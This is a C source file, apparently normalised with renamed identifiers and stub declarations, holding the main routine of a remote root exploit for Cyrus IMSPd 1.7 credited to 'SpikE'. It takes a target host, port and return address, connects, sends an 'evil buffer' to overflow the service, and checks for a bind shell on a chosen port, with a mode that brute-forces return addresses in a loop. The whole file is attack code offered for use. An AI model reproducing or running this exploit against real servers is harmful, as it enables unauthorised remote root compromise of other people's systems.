
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


struct TYPE_2__ {scalar_t__ Name; int Retaddr; } ;


 int VAR_0 ;
 int FUNC_0 (char*,int) ;
 char* FUNC_1 (int,int) ;
 int VAR_1 ;
 int VAR_2 ;
 char VAR_3 ;
 int FUNC_2 (int) ;
 int VAR_4 ;

 TYPE_1__* VAR_5 ;
 int FUNC_3 (char*) ;
 int FUNC_4 (char*,int) ;
 int FUNC_5 (char*) ;
 int FUNC_6 (int) ;
 int FUNC_7 (int) ;
 int FUNC_8 (int ) ;
 int FUNC_9 (char*) ;
 int FUNC_10 (int ,char*,...) ;
 int FUNC_11 (char*) ;
 char FUNC_12 (int,char**,char*) ;
 int FUNC_13 (char*,int*) ;
 int FUNC_14 (int,char*,int ,int ) ;
 int FUNC_15 (int) ;
 int FUNC_16 (char*,char*,int*) ;
 int VAR_6 ;
 int FUNC_17 (char*) ;

int FUNC_18(int VAR_7, char **VAR_8)
{
  extern char *VAR_9;
  extern int VAR_10;
    char VAR_11;
    char *VAR_12 = ((void*)0);
    int VAR_13 = VAR_1;
    int VAR_14 = 0;
    int VAR_15 = VAR_2;
    int VAR_16 = 0;
    int VAR_17,VAR_18,VAR_19;
    char *VAR_20;
    int VAR_21 = VAR_4;

  FUNC_10(VAR_6,"\n==[ Cyrus IMSPd 1.7 Remote Root Exploit bY SpikE ]==\n\n");


  while ( (VAR_11 = FUNC_12(VAR_7,VAR_8,"h:t:p:ba:r:")) != VAR_3)
  {
    switch(VAR_11)
    {
      case 'r':
        VAR_21 = FUNC_5(VAR_9);
        if(!VAR_21) FUNC_3(VAR_8[0]);
      break;
      case 'h':
        VAR_12 = VAR_9;
      break;
      case 'p':
        VAR_13 = FUNC_5(VAR_9);
        if(!VAR_13) FUNC_3(VAR_8[0]);
      break;
      case 'b':
        if(VAR_14 == 0)
          VAR_14 = VAR_0;
        else
          FUNC_3(VAR_8[0]);
      break;
      case 'a':
        if( FUNC_16(VAR_9,"0x%lx",&VAR_15) != 1)
          FUNC_3(VAR_8[0]);
      break;
      case 't':
        VAR_16 = FUNC_5(VAR_9);
        if(VAR_14 == 0)
          VAR_14 = 128;
        else
          FUNC_3(VAR_8[0]);
      break;
      default: FUNC_3(VAR_8[0]);
      break;
    }
  }
  if(VAR_12 == ((void*)0) || VAR_14 == 0) FUNC_3(VAR_8[0]);


  for(VAR_19=0;;VAR_19++)
    if(VAR_5[VAR_19].Name == 0) break;
  if(--VAR_19<VAR_16) FUNC_3(VAR_8[0]);

  if(VAR_14 == 128)
    FUNC_10(VAR_6,"*** Target plataform : %ld\n",VAR_5[VAR_16].Name);
  FUNC_10(VAR_6,"*** Target host : %s\n",VAR_12);
  FUNC_10(VAR_6,"*** Target port : %u\n",VAR_13);
  FUNC_10(VAR_6,"*** Bind to port : %u\n",VAR_21);

  if(VAR_14 == 128)
    FUNC_10(VAR_6,"*** Target RET : %#010x\n\n",VAR_5[VAR_16].Retaddr);
  else
    FUNC_10(VAR_6,"*** Bruteforce mode start : %#010x\n\n",VAR_15);

  switch(VAR_14)
  {
    case 128:
      VAR_17 = FUNC_0(VAR_12,VAR_13);
      if(VAR_17 == -1) FUNC_9("Could not connect");
      else FUNC_10(VAR_6,"[+] Connected\n");

      FUNC_10(VAR_6,"[+] Creating evil buffer\n");
      VAR_20 = FUNC_1(VAR_5[VAR_16].Retaddr,VAR_21);

      FUNC_10(VAR_6,"[+] Sending evil buffer\n");

      FUNC_13("%d",&VAR_19);

      FUNC_14(VAR_17,VAR_20,FUNC_17(VAR_20),0);
      FUNC_15(1);

      FUNC_10(VAR_6,"[+] Verifying ...\n");
      FUNC_15(1);
      if( (VAR_18 = FUNC_4(VAR_12,VAR_21)) >=0)
      {
        FUNC_6(VAR_17);
        FUNC_11(VAR_20);
        FUNC_10(VAR_6,"[+] Yeap.. It is a root shell\n\n");
        FUNC_7(VAR_18);
        FUNC_6(VAR_18);
        FUNC_8(0);
      }
      else
        FUNC_9("No root shell. Maybe next time");
    break;
    default:
      for(;;)
      {
        FUNC_10(VAR_6,"[+] Using RetAddr = %#010x\n",VAR_15);

        VAR_17 = FUNC_0(VAR_12,VAR_13);
        if(VAR_17 == -1)
        {

          FUNC_10(VAR_6,"[+] Could not connect. Waiting...\n\n");
          FUNC_15(120);
        }
        else
        {
          FUNC_10(VAR_6,"[+] Connected\n");

          FUNC_10(VAR_6,"[+] Creating evil buffer\n");
          VAR_20 = FUNC_1(VAR_15,VAR_21);

          FUNC_10(VAR_6,"[+] Sending evil buffer\n");
          FUNC_14(VAR_17,VAR_20,FUNC_17(VAR_20),0);
          FUNC_15(1);

          FUNC_10(VAR_6,"[+] Verifying ...\n");
          FUNC_15(1);
          if( (VAR_18 = FUNC_4(VAR_12,VAR_21)) >=0)
          {
            FUNC_6(VAR_17);
            FUNC_11(VAR_20);
            FUNC_10(VAR_6,"[+] Yeap.. It is a root shell\n\n");
            FUNC_7(VAR_18);
            FUNC_6(VAR_18);
            FUNC_8(0);
          }
          FUNC_6(VAR_17);
          FUNC_11(VAR_20);
          FUNC_10(VAR_6,"\n");

          VAR_15 = FUNC_2(VAR_15);
        }
      }
    break;
  }

  FUNC_11(VAR_20);
  FUNC_6(VAR_17);
}
